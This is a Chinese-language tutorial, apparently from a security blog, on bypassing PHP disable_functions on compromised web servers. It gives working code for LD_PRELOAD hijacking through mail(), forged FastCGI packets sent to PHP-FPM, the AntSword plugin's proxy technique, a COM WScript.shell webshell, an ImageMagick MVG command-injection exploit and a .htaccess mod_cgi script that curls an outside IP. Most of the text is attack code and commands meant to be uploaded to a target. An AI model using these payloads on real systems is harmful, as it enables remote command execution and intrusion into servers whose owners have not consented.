+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> passwd[] = <span class="string">&quot;password&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;usage: %s &lt;password&gt;/n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">strcmp</span>(passwd, argv[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Correct Password!/n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Invalid Password!/n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上述程序使用标准C函数<code>strcmp</code>函数来做比较，这是一个外部调用函数，我们来重新编写一个同名函数,代码如下(保存如下代码为b.c)：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">strcmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s1, <span class="keyword">const</span> <span class="keyword">char</span> *s2)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hack functio  n invoked. s1=&lt;%s&gt; s2=&lt;%s&gt;/n&quot;</span>, s1, s2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译以上代码为一个动态共享库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared b.c -o b.so</span><br></pre></td></tr></table></figure>
+
+<p>通过LD_PRELOAD来设置它能被其他调用它的程序优先加载</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export LD_PRELOAD&#x3D;&quot;.&#x2F;b.so&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;a bbb</span><br><span class="line">Correct Password!</span><br></pre></td></tr></table></figure>
+
+<p>随意输入字符串都会显示密码正确，这说明程序在运行时优先加载了我们自己编写的程序。</p>
+<p>程序在运行过程中调用了某个标准的动态链接库的函数，那么我们就有机会通过LD_PRELOAD来设置它优先加载我们自己编写的程序，实现劫持。</p>
+<p>在php中，可使用putenv()函数设置LD_PRELOAD环境变量来加载指定的so文件，so文件中包含自定义函数进行劫持从而达到执行恶意命令的目的。</p>
+<h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mail()函数和error_log()函数所调用的sendmail已安装</span><br><span class="line">不限制 &#x2F;usr&#x2F;sbin&#x2F;sendmail 的执行</span><br><span class="line">mail()函数和error_log()函数有一个未被禁用</span><br></pre></td></tr></table></figure>
+
+<h5 id="结合mail-函数"><a href="#结合mail-函数" class="headerlink" title="结合mail 函数"></a>结合mail 函数</h5><p>sendmail函数在运行过程动态调用了很多标准库函数。</p>
+<p>编制我们自己的动态链接程序</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -fPIC a.c -o a</span><br><span class="line">gcc -shared a -o a.so</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">()</span></span>&#123;</span><br><span class="line">         FILE*fp = fopen(<span class="string">&quot;/tmp/2.txt&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">         fclose(fp);</span><br><span class="line">         system(<span class="string">&quot;mkdir /var/www/html/test&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">geteuid</span><span class="params">()</span></span>&#123;</span><br><span class="line">  FILE *fp1=fopen(<span class="string">&quot;/tmp/2.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(fp1!=<span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">   fclose(fp1);</span><br><span class="line">         <span class="keyword">return</span> <span class="number">552</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">         payload();</span><br><span class="line">         <span class="keyword">return</span> <span class="number">552</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>利用webshell，上传编译后的a.so到目标服务器</p>
+<p>通过putenv来设置LD_PRELOAD，让我们的程序优先被调用。在webshell上用mail函数发送一封邮件来触发。利用代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   putenv(<span class="string">&quot;LD_PRELOAD=/var/www/html/a.so&quot;</span>);</span><br><span class="line">   mail(<span class="string">&quot;[email protected]&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="蚁剑插件实现思路"><a href="#蚁剑插件实现思路" class="headerlink" title="蚁剑插件实现思路"></a>蚁剑插件实现思路</h5><p>可以看出利用的关键就是我们自己构造的动态连接程序，在我们自己的动态连接程序中可以指定任何的想执行的代码，在蚁剑中，动态连接程序的主要作用就是生成一个新的php服务，其中的php.ini配置是默认的，不会存在函数限制，进而我们可以执行任何命令。在蚁剑中也是调用了mail函数。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  putenv(<span class="string">&quot;LD_PRELOAD=/tmp/hack.so&quot;</span>);</span><br><span class="line">  error_log(<span class="string">&quot;a&quot;</span>,<span class="number">1</span>);</span><br><span class="line">  mail(<span class="string">&quot;a@localhost&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>hack.so会调用php开启一个默认配置的PHPServer，并在web目录生成一个.antproxy.php，与新PHPServer建立Socket连接，转发流量到index.php一句话执行命令。</p>
+<h4 id="linux–蚁剑插件–Fastcgi-PHP-FPM"><a href="#linux–蚁剑插件–Fastcgi-PHP-FPM" class="headerlink" title="linux–蚁剑插件–Fastcgi/PHP-FPM"></a>linux–蚁剑插件–Fastcgi/PHP-FPM</h4><p>CGI是一种协议，web服务器运行时外部程序的规范，是为了解决web服务器与其他应用之间的通信问题。Fastcgi是为了弥补CGI的缺陷而产生的。PHP-FPM 则是php环境中对Fastcgi协议的管理程序实现。</p>
+<p>这里我们看一下php-fmp的主要作用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">www.example.com&#x2F;index.php</span><br><span class="line">        |</span><br><span class="line">        |</span><br><span class="line">      nginx</span><br><span class="line">        |</span><br><span class="line">        |</span><br><span class="line">加载nginx的fast-cgi模块</span><br><span class="line">        |</span><br><span class="line">        |</span><br><span class="line">fast-cgi对根据fast-cgi协议请求包进行封装，然后将封装好的包发给php-fpm</span><br><span class="line">        |</span><br><span class="line">        |</span><br><span class="line">php-fpm 据fast-cgi协议将TCP流解析成真正的数据,调用php文件</span><br><span class="line">        |</span><br><span class="line">        |</span><br><span class="line">php-fpm处理完请求，返回给nginx</span><br><span class="line">        |</span><br><span class="line">        |</span><br><span class="line">nginx将结果通过http返回给浏览器</span><br></pre></td></tr></table></figure>
+
+<p>可以看到php-fmp的作用就是解析流量，拿到真正的数据然后把数据传递给nignx，fpm与nginx之间的通信方式有tcp和套接字(unix socket)两种方式，所以可以利用 WebShell 直接与 PHP FastCGI (FPM) 来实现Bypass Disable Functions。</p>
+<h5 id="利用方式-2"><a href="#利用方式-2" class="headerlink" title="利用方式"></a>利用方式</h5><h6 id="伪造fast-cgi数据包"><a href="#伪造fast-cgi数据包" class="headerlink" title="伪造fast-cgi数据包"></a>伪造fast-cgi数据包</h6><p>总的思路就是伪造fatcgi数据包让php-fpm去解析。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python fpm.py 127.0.0.1 -p 9000 本地已经存在的php文件，比如&#x2F;steady.php -c &#39;&lt;?php echo &#96;id&#96;;exit;?&gt;&#39;</span><br></pre></td></tr></table></figure>
+
+<p>本地必须要有一个一直的PHP文件，因为php-fpm拿到fastcgi数据包后，先回去判断客户端请求的文件是否存在（即fastcgi数据包中的文件名），如果不存在就不会执行。</p>
+<p>伪造的协议包</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#39;GATEWAY_INTERFACE&#39;: &#39;FastCGI&#x2F;1.0&#39;,</span><br><span class="line">    &#39;REQUEST_METHOD&#39;: &#39;GET&#39;,</span><br><span class="line">    &#39;SCRIPT_FILENAME&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;hackme.php&#39;,</span><br><span class="line">    &#39;SCRIPT_NAME&#39;: &#39;&#x2F;hackme.php&#39;,</span><br><span class="line">    &#39;QUERY_STRING&#39;: &#39;?test&#x3D;1&#39;,</span><br><span class="line">    &#39;REQUEST_URI&#39;: &#39;&#x2F;hackme.php?test&#x3D;1&#39;,</span><br><span class="line">    &#39;DOCUMENT_ROOT&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#39;,</span><br><span class="line">    &#39;SERVER_SOFTWARE&#39;: &#39;php&#x2F;fcgiclient&#39;,</span><br><span class="line">    &#39;REMOTE_ADDR&#39;: &#39;127.0.0.1&#39;,</span><br><span class="line">    &#39;REMOTE_PORT&#39;: &#39;6666&#39;,</span><br><span class="line">    &#39;SERVER_ADDR&#39;: &#39;127.0.0.1&#39;,</span><br><span class="line">    &#39;SERVER_PORT&#39;: &#39;80&#39;,</span><br><span class="line">    &#39;SERVER_NAME&#39;: &quot;localhost&quot;,</span><br><span class="line">    &#39;SERVER_PROTOCOL&#39;: &#39;HTTP&#x2F;1.1&#39;</span><br><span class="line">    &#39;PHP_VALUE&#39;: &#39;auto_prepend_file &#x3D; php:&#x2F;&#x2F;input&#39;,</span><br><span class="line">    &#39;PHP_ADMIN_VALUE&#39;: &#39;allow_url_include &#x3D; On&#39;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>设置auto_prepend_file = php://input以及allow_url_include = On，实现在执行php文件执行前进行远程文件包含POST内容，从而任意代码执行。</p>
+<h6 id="使用webshell攻击PHP-FPM–蚁剑插件"><a href="#使用webshell攻击PHP-FPM–蚁剑插件" class="headerlink" title="使用webshell攻击PHP-FPM–蚁剑插件"></a>使用webshell攻击PHP-FPM–蚁剑插件</h6><p>上传php文件，用来重新启动一个web服务，web服务的php.ini不再是原本服务的php.ini，进而绕过了原本服务的函数限制。</p>
+<p>.antproxy.php分析</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    set_time_limit(120);</span><br><span class="line">    $aAccess &#x3D; curl_init();</span><br><span class="line">    curl_setopt($aAccess, CURLOPT_URL, &quot;http:&#x2F;&#x2F;127.0.0.1:60733&#x2F;index.php?&quot;.$_SERVER[&#39;QUERY_STRING&#39;]);</span><br></pre></td></tr></table></figure>
+
+<p>像本地的60733端口发起请求，60733端口新启了一个web服务程序，启动命令为(该命令的启动是由于下文中的so文件执行导致)：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -n -S 127.0.0.1:63611 -t &#x2F;var&#x2F;www&#x2F;html</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-S 127.0.0.1:63611：新Web服务的监听地址；</span><br><span class="line">-t &#x2F;var&#x2F;www&#x2F;html&#x2F;：新HTTP服务的Web根目录，可随便指，只要保证那个目录下面有个PHP WebShell就行，建议是直接指定成Shell当前目录；</span><br><span class="line">-n：表示不使用php.ini，这个新的服务PHP用的是默认配置，是核心所在，从而根本不受php.ini中disable_functions的影响，当使用代理连接到该PHP服务时也就实现Bypass了；</span><br></pre></td></tr></table></figure>
+
+<p>.69773ant_x64.so分析</p>
+<p>主要作用就是执行恶意命令，其中的命令就是新起PHP服务的命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -n -S 127.0.0.1:63611 -t &#x2F;var&#x2F;www&#x2F;html</span><br></pre></td></tr></table></figure>
+
+<p>so文件是如何执行的？</p>
+<p>Nginx为fastcgi 提供了 fastcgi_param 来主要处理映射关系，将 Nginx 中的变量翻译成 PHP 能够理解的变量，也就是说fastcgi也是有变量的，类似于PHP的预定义变量。</p>
+<p>例如用户访问<code>http://127.0.0.1/steady.php?test=1</code>，假设web目录为/var/www/html，那么请求会被解析成如下键值对：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#39;GATEWAY_INTERFACE&#39;: &#39;FastCGI&#x2F;1.0&#39;,</span><br><span class="line">    &#39;REQUEST_METHOD&#39;: &#39;GET&#39;,</span><br><span class="line">    &#39;SCRIPT_FILENAME&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;hackme.php&#39;,</span><br><span class="line">    &#39;SCRIPT_NAME&#39;: &#39;&#x2F;hackme.php&#39;,</span><br><span class="line">    &#39;QUERY_STRING&#39;: &#39;?test&#x3D;1&#39;,</span><br><span class="line">    &#39;REQUEST_URI&#39;: &#39;&#x2F;hackme.php?test&#x3D;1&#39;,</span><br><span class="line">    &#39;DOCUMENT_ROOT&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#39;,</span><br><span class="line">    &#39;SERVER_SOFTWARE&#39;: &#39;php&#x2F;fcgiclient&#39;,</span><br><span class="line">    &#39;REMOTE_ADDR&#39;: &#39;127.0.0.1&#39;,</span><br><span class="line">    &#39;REMOTE_PORT&#39;: &#39;6666&#39;,</span><br><span class="line">    &#39;SERVER_ADDR&#39;: &#39;127.0.0.1&#39;,</span><br><span class="line">    &#39;SERVER_PORT&#39;: &#39;80&#39;,</span><br><span class="line">    &#39;SERVER_NAME&#39;: &quot;localhost&quot;,</span><br><span class="line">    &#39;SERVER_PROTOCOL&#39;: &#39;HTTP&#x2F;1.1&#39;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中fast-cgi有两个变量<code>PHP_VALUE及PHP_ADMIN_VALUE</code>，他们的作用就是可以指定修改范围为<code>PHP_INI_USER和PHP_INI_ALL</code>的php配置项的值。而php配置项<code>auto_prepend_file</code>的作用就是执行任何php文件加载之前执行的文件。通过以下指令，来实现该功能，这里如果把文件改为上文的so文件即可执行，然后重新启动一个web服务进程。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastcgi_param PHP_VALUE &quot;auto_prepend_file&#x3D;&#x2F;steady.php&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>最终流程：</p>
+<ul>
+<li><p>随机生成一个端口号，作为后续新起的PHP服务的端口。</p>
+</li>
+<li><p>判断当前PHP-FPM与nignx为TCP模式或Unix Socket模式来据此获得FPM地址和端口。</p>
+</li>
+<li><p>生成用于执行php命令来生成一个新的php服务的so文件并上传。</p>
+</li>
+<li><p>开始绕过</p>
+<p>初始化fastcgi客户端</p>
+<p>伪造fastcgi数据包</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$content&#x3D;&quot;&quot;;</span><br><span class="line">$client &#x3D; new Client(&#39;$&#123;fpm_host&#125;&#39;,$&#123;fpm_port&#125;);</span><br><span class="line">$client-&gt;request(array(</span><br><span class="line">  &#39;GATEWAY_INTERFACE&#39; &#x3D;&gt; &#39;FastCGI&#x2F;1.0&#39;,</span><br><span class="line">  &#39;REQUEST_METHOD&#39; &#x3D;&gt; &#39;POST&#39;,</span><br><span class="line">  &#39;SERVER_SOFTWARE&#39; &#x3D;&gt; &#39;php&#x2F;fcgiclient&#39;,</span><br><span class="line">  &#39;REMOTE_ADDR&#39; &#x3D;&gt; &#39;127.0.0.1&#39;,</span><br><span class="line">  &#39;REMOTE_PORT&#39; &#x3D;&gt; &#39;9984&#39;,</span><br><span class="line">  &#39;SERVER_ADDR&#39; &#x3D;&gt; &#39;127.0.0.1&#39;,</span><br><span class="line">  &#39;SERVER_PORT&#39; &#x3D;&gt; &#39;80&#39;,</span><br><span class="line">  &#39;SERVER_NAME&#39; &#x3D;&gt; &#39;mag-tured&#39;,</span><br><span class="line">  &#39;SERVER_PROTOCOL&#39; &#x3D;&gt; &#39;HTTP&#x2F;1.1&#39;,</span><br><span class="line">  &#39;CONTENT_TYPE&#39; &#x3D;&gt; &#39;application&#x2F;x-www-form-urlencoded&#39;,</span><br><span class="line">  &#39;PHP_VALUE&#39; &#x3D;&gt; &#39;extension&#x3D;$&#123;p&#125;&#39;,</span><br><span class="line">  &#39;PHP_ADMIN_VALUE&#39; &#x3D;&gt; &#39;extension&#x3D;$&#123;p&#125;&#39;,</span><br><span class="line">  &#39;CONTENT_LENGTH&#39; &#x3D;&gt; strlen($content)</span><br><span class="line">  ),</span><br><span class="line">  $content</span><br><span class="line">);</span><br><span class="line">sleep(1);</span><br><span class="line">echo(1);</span><br></pre></td></tr></table></figure>
+
+<p>着重看一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39;PHP_VALUE&#39; &#x3D;&gt; &#39;extension&#x3D;$&#123;p&#125;&#39;,</span><br><span class="line">&#39;PHP_ADMIN_VALUE&#39; &#x3D;&gt; &#39;extension&#x3D;$&#123;p&#125;&#39;,</span><br></pre></td></tr></table></figure>
+
+<p>他们的作用就是执行我们的so文件，进而生成新的php进程。</p>
+</li>
+<li><p>最后向php-fmp发送fastcgi请求包，加载so文件，启动新的php服务，加载新的php.ini配置文件</p>
+</li>
+</ul>
+<h4 id="win-系统组件绕过"><a href="#win-系统组件绕过" class="headerlink" title="win-系统组件绕过"></a>win-系统组件绕过</h4><p>window com组件(php 5.4)(高版本扩展要自己添加）,要在php.ini中开启。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">com.allow_dcom &#x3D; true</span><br><span class="line">extension &#x3D; php_com_dotnet.dll</span><br></pre></td></tr></table></figure>
+
+<p>通过COM组件直接调用WScript.shell或Shell.Application执行系统命令。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用代码，利用shell上传如下代码到目标服务器上</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$command=$_GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">$wsh = <span class="keyword">new</span> COM(<span class="string">&#x27;WScript.shell&#x27;</span>); <span class="comment">// 生成一个COM对象　Shell.Application也能</span></span><br><span class="line">$exec = $wsh-&gt;exec(<span class="string">&quot;cmd /c &quot;</span>.$command); <span class="comment">//调用对象方法来执行命令</span></span><br><span class="line">$stdout = $exec-&gt;StdOut();</span><br><span class="line">$stroutput = $stdout-&gt;ReadAll();</span><br><span class="line"><span class="keyword">echo</span> $stroutput;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="ImageMagick漏洞"><a href="#ImageMagick漏洞" class="headerlink" title="ImageMagick漏洞"></a>ImageMagick漏洞</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Disable Functions: &quot;</span> . ini_get(<span class="string">&#x27;disable_functions&#x27;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">$command = PHP_SAPI == <span class="string">&#x27;cli&#x27;</span> ? $argv[<span class="number">1</span>] : $_GET[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> ($command == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    $command = <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$exploit = &lt;&lt;&lt;EOF</span><br><span class="line">push graphic-context</span><br><span class="line">viewbox <span class="number">0</span> <span class="number">0</span> <span class="number">640</span> <span class="number">480</span></span><br><span class="line">fill <span class="string">&#x27;url(https://example.com/image.jpg&quot;|$command&quot;)&#x27;</span></span><br><span class="line">pop graphic-context</span><br><span class="line">EOF;</span><br><span class="line"></span><br><span class="line">file_put_contents(<span class="string">&quot;KKKK.mvg&quot;</span>, $exploit);</span><br><span class="line">$thumb = <span class="keyword">new</span> Imagick();</span><br><span class="line">$thumb-&gt;readImage(<span class="string">&#x27;KKKK.mvg&#x27;</span>);</span><br><span class="line">$thumb-&gt;writeImage(<span class="string">&#x27;KKKK.png&#x27;</span>);</span><br><span class="line">$thumb-&gt;clear();</span><br><span class="line">$thumb-&gt;destroy();</span><br><span class="line">unlink(<span class="string">&quot;KKKK.mvg&quot;</span>);</span><br><span class="line">unlink(<span class="string">&quot;KKKK.png&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="蚁剑插件–Apache-Mod-CGI"><a href="#蚁剑插件–Apache-Mod-CGI" class="headerlink" title="蚁剑插件–Apache Mod CGI"></a>蚁剑插件–Apache Mod CGI</h4><p>主要原理就是在<code>.htaccess </code>文件中设置指令，通过<code>apache cgi-script</code>执行脚本。</p>
+<p>Mod CGI就是把PHP做为APACHE一个内置模块，让apache http服务器本身能够支持PHP语言，不需要每一个请求都通过启动PHP解释器来解释PHP，在<code>.htacess</code>中可以设置以下指令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">添加Options +ExecCGI，代表着允许使用mod_cgi模块执行CGI脚本。</span><br><span class="line">添加AddHandler cgi-script .cgi，代表着包含.cgi扩展名的文件都将被视为CGI程序。</span><br><span class="line">也可以是</span><br><span class="line">AddHandler cgi-script .sh</span><br></pre></td></tr></table></figure>
+
+<p>上传 sh 文件，浏览器访问即可执行其中的命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">echo &quot;Content-type: text&#x2F;html&quot;</span><br><span class="line">echo &quot;Hello, Shell&quot;</span><br><span class="line">curl 192.168.214.107:7777</span><br></pre></td></tr></table></figure>
+
+<h5 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
+<li><p>Apache 开启 AllowOverride</p>
+<p>当apache配置文件中指定web目录下AllowOverride参数值为None 时，.htaccess 文件无法生效。</p>
+<p>在apache2.3.8版本之前AllowOverride参数值默认设置为 All，.htaccess 文件设置的指令可生效。</p>
+</li>
+<li><p>开启 cgi_module</p>
+</li>
+<li><p>.htaccess 文件可写</p>
+</li>
+<li><p>cgi 程序可执行</p>
+</li>
+</ul>
+<h4 id="蚁剑插件–Json-Serializer-UAF"><a href="#蚁剑插件–Json-Serializer-UAF" class="headerlink" title="蚁剑插件–Json Serializer UAF"></a>蚁剑插件–Json Serializer UAF</h4><h5 id="利用条件-2"><a href="#利用条件-2" class="headerlink" title="利用条件"></a>利用条件</h5><p>影响范围是linux，php7.0-7.3</p>
+<p>php-json-bypass漏洞利用json序列化程序中的堆溢出触发，以绕过disable_functions并执行系统命令。</p>
